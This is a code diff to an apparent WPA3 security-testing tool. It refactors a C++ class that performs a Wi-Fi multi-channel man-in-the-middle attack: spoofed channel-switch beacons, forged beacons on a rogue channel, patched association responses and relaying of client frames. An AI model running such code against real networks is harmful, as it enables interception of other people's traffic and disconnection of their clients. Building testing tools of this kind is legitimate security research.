@@ -2,10 +2,8 @@
 
 #include <cstring>
 #include <chrono>
-#include <thread>
 #include <utility>
 #include <tins/tins.h>
-
 #include "attacks/DoS_soft/channel_switch/channel_switch.h"
 #include "attacks/mc_mitm/wifi_util.h"
 #include "logger/log.h"
@@ -15,14 +13,17 @@ namespace wpa3_tester{
     using namespace std;
     using namespace chrono;
     using namespace Tins;
+    static uint16_t sn = 0;
 
     McMitm::McMitm(string  nic_real,
                    string  nic_rogue,
                    string  ssid,
+                   string  ap_mac,
                    string  client_mac)
-        : nic_real_ap(std::move(nic_real)),
-          nic_rogue_ap(std::move(nic_rogue)),
+        : r_client_iface(std::move(nic_real)),
+          r_ap_iface(std::move(nic_rogue)),
           ssid(std::move(ssid)),
+          ap_mac(std::move(ap_mac)),
           client_mac(std::move(client_mac))
     {}
 
@@ -58,7 +59,7 @@ namespace wpa3_tester{
         probe_resp.reset(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
         beacon.reset(beacon_channel_patch(*beacon, netconfig.rogue_channel));
 
-        CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel, netconfig.rogue_channel, 1);
+        CSA_attack::send_CSA_beacon(ap_mac, r_client_iface, ssid, netconfig.real_channel, netconfig.rogue_channel, 1);
 
         last_real_beacon  = now_sec();
         last_rogue_beacon = now_sec();
@@ -69,6 +70,7 @@ namespace wpa3_tester{
         pcap_setnonblock(sniffer_rogue->get_pcap_handle(), 1, nullptr);
 
         while (true) {
+            //cerr << "awdwadwa" << endl;
             if (deadline > 0 && now_sec() > deadline) {
                 log(LogLevel::INFO, "McMitm timeout reached, stopping.");
                 break;
@@ -81,10 +83,10 @@ namespace wpa3_tester{
                 if (!(pfd.revents & POLLIN)) return;
 
                 pcap_pkthdr* header;
-                const u_char* packet;
-                while (pcap_next_ex(sniffer.get_pcap_handle(), &header, &packet) == 1) {
+                const u_char* frame;
+                while (pcap_next_ex(sniffer.get_pcap_handle(), &header, &frame) == 1) {
                     try{
-                        RadioTap rt_new(packet, header->caplen);
+                        RadioTap rt_new(frame, header->caplen);
                         (this->*handler)(rt_new);
                     }catch(...){
                         log(LogLevel::ERROR, "Failed to process packet");
@@ -96,11 +98,15 @@ namespace wpa3_tester{
             try_sniff(*sniffer_rogue, &McMitm::handle_rx_rogue_chan);
 
             if (next_beacon <= now_sec()) {
-                //CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
+                //CSA_attack::send_CSA_beacon(ap_mac, r_client_iface, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
 
                 RadioTap rt;
-                rt.inner_pdu(beacon->clone());
-                sender_rogue->send(rt);
+                const auto now_us = duration_cast<microseconds>(steady_clock::now().time_since_epoch()).count();
+                const auto actual_beacon = beacon->clone();
+                //actual_beacon->timestamp(now_us);
+                //actual_beacon->seq_num(sn++);
+                rt.inner_pdu(actual_beacon);
+                sender_rogue->send(rt, r_client_iface);
 
                 next_beacon += 0.10;
             }
@@ -212,7 +218,7 @@ namespace wpa3_tester{
         if (addr1 == ap_mac) {
             if (dot11->subtype() == Dot11::AUTH) {
                 log(LogLevel::WARNING, "Client %s connecting on real channel, sending CSA", addr2.c_str());
-                CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid,
+                CSA_attack::send_CSA_beacon(ap_mac, r_client_iface, ssid,
                                             netconfig.real_channel, netconfig.rogue_channel, 1);
             }
             print_rx(LogLevel::DEBUG, "Real channel", *dot11);
@@ -231,13 +237,13 @@ namespace wpa3_tester{
                     const unique_ptr<Dot11AssocResponse> patched(assoc_resp_channel_patch(*assoc, netconfig.rogue_channel));
                     RadioTap rt;
                     rt.inner_pdu(patched->clone());
-                    sender_rogue->send(rt, nic_rogue_ap);
+                    sender_rogue->send(rt, r_ap_iface);
                     print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM (patched AssocResp)");
                     return;
                 }
             }
 
-            sender_rogue->send(pdu, nic_rogue_ap);
+            sender_rogue->send(pdu, r_ap_iface);
             print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM");
         }
     }
@@ -271,7 +277,7 @@ namespace wpa3_tester{
             // Frames forwarded from real AP — our own frames coming back, ignore
             if (dot11->subtype() == Dot11::BEACON) return;
             try {
-                sender_real->send(pdu, nic_real_ap);
+                sender_real->send(pdu, r_client_iface);
             } catch (const socket_write_error& e) {
                 log(LogLevel::WARNING, "send failed (subtype=%d): %s", dot11->subtype(), e.what());
             }
